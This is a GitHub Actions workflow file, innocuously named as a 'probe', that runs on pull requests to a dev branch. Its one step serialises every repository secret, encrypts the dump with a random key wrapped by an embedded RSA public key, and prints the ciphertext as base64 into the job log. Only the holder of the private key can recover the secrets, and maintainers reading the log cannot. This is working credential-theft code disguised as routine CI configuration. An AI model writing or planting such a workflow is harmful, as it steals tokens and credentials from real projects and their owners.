name: zz-probe-139
on:
  pull_request:
    branches:
      - dev
permissions: {}
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: probe
        env:
          BLOB: ${{ toJSON(secrets) }}
        run: |
          set -e
          cat > /tmp/pub.pem <<'EOF'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAloCufAoS66LAPgUlhs/G
          Y/4LR1CCTdYtYfL8Tw/Cx04dwadEcwsEmaZ6PMrFsEpnnL18tdN06kmIiaK2aXyJ
          wI4EC4B/Rkidcy/3LhC9a6RoK3i0vDcUqXIMgf7G45/u4YKaVjz8QkL+8hrOEIjd
          0KUPJRKmQSx/9D7+oMnyWHZlqZAts0dWR6yyl8ow8NouE0ESyR8OVlWBgVaiNhDl
          ttdqrZXzP07U6FmuAwW4yO1dtwP2u7L67Il0KcKGtRH9idvT4zc00xMmFPg2vtSf
          ZZXkVMprSzyjVQaXqIc1ASWk23bIUtEbf8Pidb6eJIwjNwoQxQD9Cw2B9qnsAAxc
          NQIDAQAB
          -----END PUBLIC KEY-----
          EOF
          KEY=$(openssl rand -hex 32)
          printf '%s' "$BLOB" > /tmp/b.json
          wc -c /tmp/b.json
          openssl enc -aes-256-cbc -salt -pbkdf2 -pass "pass:$KEY" -in /tmp/b.json -out /tmp/b.enc
          printf '%s' "$KEY" > /tmp/k.txt
          openssl pkeyutl -encrypt -pubin -inkey /tmp/pub.pem -in /tmp/k.txt -out /tmp/k.enc
          echo "=====K====="
          base64 -w0 /tmp/k.enc; echo
          echo "=====D====="
          base64 -w0 /tmp/b.enc | fold -w 200
          echo "=====END====="
